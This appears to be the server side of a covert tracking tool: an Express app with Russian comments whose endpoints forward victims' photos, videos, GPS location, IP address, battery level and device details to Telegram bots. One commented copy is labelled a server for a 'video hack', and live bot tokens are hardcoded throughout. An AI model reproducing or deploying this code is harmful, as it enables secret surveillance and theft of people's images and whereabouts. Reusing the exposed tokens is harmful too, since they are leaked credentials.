// Серверный код
import express from 'express';
import axios from 'axios';
import FormData from 'form-data';
import cors from 'cors';
import multer from 'multer';
import ip from 'express-ip';

const app = express();
const PORT = 5000;
app.use(cors())
app.use(express.json())

app.set('trust proxy', true);

app.use(ip().getIpInfoMiddleware); 

const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// новый функционал
app.post('/sendDataToTelegram', upload.none(), async(req, res)=>{
  const {chat_id, batteryLevel, deviceInfo, screenWidth, screenHeight, clientIp} = req.body


  try{
    const userIP = req.headers['x-forwarded-for'] || clientIp;
    const apiUrl = `https://api.telegram.org/bot7654585303:AAFLJMpcU2znRSbob-KPUgM0XZE1QTqDR3k/sendMessage`;

    const formData = new FormData();
    formData.append('chat_id', chat_id);

    const text = `User Data:\n\n` +
                    `🔋 battery Level : ${batteryLevel}\n\n` +
                    `📍 IP Address: ${userIP}\n\n` +
                    `🌐 Browser: ${req.headers['user-agent']}\n\n` +
                    `📱 Device: ${req.headers['user-agent'].includes('Mobile') ? 'Mobile Device' : 'Desktop Device'}\n\n` +
                    `🖥 Platform: ${req.headers['user-agent'].includes('Windows') ? 'Windows' : 'Other'}\n\n` +
                    `📏 Resolution: ${screenWidth}x${screenHeight}`;

    formData.append('text', text);

    
    const response = await axios.post(apiUrl, formData, {
      headers: {
        ...formData.getHeaders(),
      },
    });

  }catch(err){
    
  }
})

app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
  const { chat_id } = req.body;
  const photo = req.file;
  if (!photo) { 
    return res.status(400).send('No file uploaded');
  }

  try {

    const apiUrl = `https://api.telegram.org/bot7654585303:AAFLJMpcU2znRSbob-KPUgM0XZE1QTqDR3k/sendPhoto`;

    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('photo', photo.buffer, {
      filename: photo.originalname,
      contentType: photo.mimetype,
      knownLength: photo.size,
    });

    // const caption = `User Data:\n\n` +
    //                 `🔋 battery Level : ${batteryLevel}\n\n` +
    //                 `📍 IP Address: ${userIP}\n\n` +
    //                 `🌐 Browser: ${req.headers['user-agent']}\n\n` +
    //                 `📱 Device: ${req.headers['user-agent'].includes('Mobile') ? 'Mobile Device' : 'Desktop Device'}\n\n` +
    //                 `🖥 Platform: ${req.headers['user-agent'].includes('Windows') ? 'Windows' : 'Other'}\n\n` +
    //                 `📏 Resolution: ${screenWidth}x${screenHeight}`;

    // formData.append('caption', caption);

    const response = await axios.post(apiUrl, formData, {
      headers: {
        ...formData.getHeaders(),
      },
    });

    // console.log('Photo sent to Telegram:', response.data);
    res.sendStatus(200);
  } catch (error) {
    console.error('Error sending photo to Telegram:', error);
    res.status(500).send('Error sending photo to Telegram');
  }
});

app.post('/sendLocationToTelegram', async (req, res) => {
  const { chat_id, latitude, longitude, clientIp } = req.body;
  
  console.log(latitude, longitude);
  try {
    const userIP = req.headers['x-forwarded-for'] || clientIp;

    const apiUrl = `https://api.telegram.org/bot7654585303:AAFLJMpcU2znRSbob-KPUgM0XZE1QTqDR3k/sendLocation`;

    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('latitude', latitude);
    formData.append('longitude', longitude);

    const response = await axios.post(apiUrl, formData, {
      headers: {
        ...formData.getHeaders(),
      },
    });

    // console.log('Location sent to Telegram:', response.data);
    res.sendStatus(200);
  } catch (error) {
    console.error('Error sending location to Telegram:', error);
    res.status(500).send('Error sending location to Telegram');
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});



// BACKUP
// import express from 'express';
// import axios from 'axios';
// import FormData from 'form-data';
// import cors from 'cors';
// import multer from 'multer';
// import ip from 'express-ip';

// const app = express();
// const PORT = 5000;

// app.set('trust proxy', true); // Устанавливаем для Express доверие к прокси-серверу

// app.use(ip().getIpInfoMiddleware); // Используем middleware для получения информации об IP адресе

// const storage = multer.memoryStorage();
// const upload = multer({ storage: storage });

// app.use(express.json());
// app.use(cors());

// app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
//   const { chat_id, batteryLevel, deviceInfo } = req.body;
//   const photo = req.file;

//   if (!photo) {
//     return res.status(400).send('No file uploaded');
//   }

//   try {
//     const userIP = req.headers['x-forwarded-for'] || req.ipInfo.clientIp;

//     const apiUrl = `https://api.telegram.org/bot6725080038:AAGg7RFm3R6DDkVaYPnv-lST7HeA-jI_mzI/sendPhoto`; // Замените <YOUR_BOT_TOKEN> на ваш токен бота

//     const formData = new FormData();
//     formData.append('chat_id', chat_id);
//     formData.append('photo', photo.buffer, {
//       filename: photo.originalname,
//       contentType: photo.mimetype,
//       knownLength: photo.size,
//     });

//     const caption = `Данные о пользователе:\n\n` +
//                     `🔋 Уровень батареи: ${batteryLevel}\n\n` +
//                     `📍 IP Address: ${userIP}\n\n` +
//                     `🌐 Browser: ${req.headers['user-agent']}\n\n` +
//                     `📱 Тип устройства: ${req.headers['user-agent'].includes('Mobile') ? 'Mobile Device' : 'Desktop Device'}\n\n` +
//                     `🖥 Платформа: ${req.headers['user-agent'].includes('Windows') ? 'Windows' : 'Other'}\n\n` +
//                     `📏 Разрешение экрана: ${req.headers['screen-width']}x${req.headers['screen-height']}`;

//     formData.append('caption', caption);

//     const response = await axios.post(apiUrl, formData, {
//       headers: {
//         ...formData.getHeaders(),
//       },
//     });

//     console.log('Photo sent to Telegram:', response.data);
//     res.sendStatus(200);
//   } catch (error) {
//     console.error('Error sending photo to Telegram:', error);
//     res.status(500).send('Error sending photo to Telegram');
//   }
// });


// app.post('/sendLocationToTelegram', async (req, res) => {
//   const { chat_id, latitude, longitude } = req.body;

//   try {
//     const userIP = req.headers['x-forwarded-for'] || req.ipInfo.clientIp;

//     const apiUrl = `https://api.telegram.org/bot6725080038:AAGg7RFm3R6DDkVaYPnv-lST7HeA-jI_mzI/sendLocation`;

//     const formData = new FormData();
//     formData.append('chat_id', chat_id);
//     formData.append('latitude', latitude);
//     formData.append('longitude', longitude);

//     const response = await axios.post(apiUrl, formData, {
//       headers: {
//         ...formData.getHeaders(),
//       },
//     });

//     console.log('Location sent to Telegram:', response.data);
//     res.sendStatus(200);
//   } catch (error) {
//     console.error('Error sending location to Telegram:', error);
//     res.status(500).send('Error sending location to Telegram');
//   }
// });

// app.listen(PORT, () => {
//   console.log(`Server is running on port ${PORT}`);
// });
















// Сервер для видео хака
// import express from 'express';
// import axios from 'axios';
// import FormData from 'form-data';
// import cors from 'cors';
// import multer from 'multer';
// import ip from 'express-ip';

// const app = express();
// const PORT = 5000;

// app.set('trust proxy', true);
// app.use(ip().getIpInfoMiddleware);
// app.use(express.json());
// app.use(cors());

// const storage = multer.memoryStorage();
// const upload = multer({ storage: storage });

// app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
//   const { chat_id, batteryLevel } = req.body;
//   const photo = req.file;

//   if (!photo) {
//     return res.status(400).send('No file uploaded');
//   }

//   try {
//     const userIP = req.headers['x-forwarded-for'] || req.ipInfo.clientIp;

//     const apiUrl = `https://api.telegram.org/bot6725080038:AAGg7RFm3R6DDkVaYPnv-lST7HeA-jI_mzI/sendPhoto`;

//     const formData = new FormData();
//     formData.append('chat_id', chat_id);
//     formData.append('photo', photo.buffer, {
//       filename: photo.originalname,
//       contentType: photo.mimetype,
//       knownLength: photo.size,
//     });

//     const caption = `User Information:\n\n` +
//                     `🔋 Battery Level: ${batteryLevel}\n\n` +
//                     `📍 IP Address: ${userIP}\n\n` +
//                     `🌐 Browser: ${req.headers['user-agent']}\n\n` +
//                     `📱 Device Type: ${req.headers['user-agent'].includes('Mobile') ? 'Mobile Device' : 'Desktop Device'}\n\n` +
//                     `🖥 Platform: ${req.headers['user-agent'].includes('Windows') ? 'Windows' : 'Other'}\n\n` +
//                     `📏 Screen Resolution: ${req.headers['screen-width']}x${req.headers['screen-height']}`;

//     formData.append('caption', caption);

//     const response = await axios.post(apiUrl, formData, {
//       headers: {
//         ...formData.getHeaders(),
//       },
//     });

//     console.log('Photo sent to Telegram:', response.data);
//     res.sendStatus(200);
//   } catch (error) {
//     console.error('Error sending photo to Telegram:', error);
//     res.status(500).send('Error sending photo to Telegram');
//   }
// });

// app.post('/sendVideoToTelegram', upload.single('video'), async (req, res) => {
//   const { chat_id, batteryLevel, deviceInfo } = req.body;
//   const video = req.file;

//   if (!video) {
//     return res.status(400).send('No file uploaded');
//   }

//   try {
//     const userIP = req.headers['x-forwarded-for'] || req.ipInfo.clientIp;

//     const apiUrl = `https://api.telegram.org/bot6725080038:AAGg7RFm3R6DDkVaYPnv-lST7HeA-jI_mzI/sendVideo`;

//     const formData = new FormData();
//     formData.append('chat_id', chat_id);
//     formData.append('video', video.buffer, {
//       filename: video.originalname,
//       contentType: video.mimetype,
//       knownLength: video.size,
//     });

//     const caption = `User Information:\n\n` +
//                     `🔋 Battery Level: ${batteryLevel}\n\n` +
//                     `📍 IP Address: ${userIP}\n\n` +
//                     `🌐 Browser: ${req.headers['user-agent']}\n\n` +
//                     `📱 Device Type: ${req.headers['user-agent'].includes('Mobile') ? 'Mobile Device' : 'Desktop Device'}\n\n` +
//                     `🖥 Platform: ${req.headers['user-agent'].includes('Windows') ? 'Windows' : 'Other'}\n\n` +
//                     `📏 Screen Resolution: ${req.headers['screen-width']}x${req.headers['screen-height']}`;

//     formData.append('caption', caption);

//     const response = await axios.post(apiUrl, formData, {
//       headers: {
//         ...formData.getHeaders(),
//       },
//     });

//     console.log('Video sent to Telegram:', response.data);
//     res.sendStatus(200);
//   } catch (error) {
//     console.error('Error sending video to Telegram:', error);
//     res.status(500).send('Error sending video to Telegram');
//   }
// });

// app.post('/sendLocationToTelegram', async (req, res) => {
//   const { chat_id, latitude, longitude } = req.body;

//   try {
//     const userIP = req.headers['x-forwarded-for'] || req.ipInfo.clientIp;

//     const apiUrl = `https://api.telegram.org/bot6725080038:AAGg7RFm3R6DDkVaYPnv-lST7HeA-jI_mzI/sendLocation`;

//     const formData = new FormData();
//     formData.append('chat_id', chat_id);
//     formData.append('latitude', latitude);
//     formData.append('longitude', longitude);

//     const response = await axios.post(apiUrl, formData, {
//       headers: {
//         ...formData.getHeaders(),
//       },
//     });

//     console.log('Location sent to Telegram:', response.data);
//     res.sendStatus(200);
//   } catch (error) {
//     console.error('Error sending location to Telegram:', error);
//     res.status(500).send('Error sending location to Telegram');
//   }
// });


// app.listen(PORT, () => {
//   console.log(`Server is running on port ${PORT}`);
// });